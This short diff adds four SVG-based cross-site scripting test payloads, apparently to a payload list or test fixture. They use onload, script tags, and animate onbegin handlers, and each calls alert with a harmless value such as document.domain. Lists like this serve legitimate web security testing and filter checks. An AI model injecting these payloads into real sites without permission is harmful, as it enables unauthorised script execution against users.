@@ -1,0 +1,4 @@
+<svg onload=alert(1)>
+<svg><script>alert('XSS')</script>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s/>
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script>
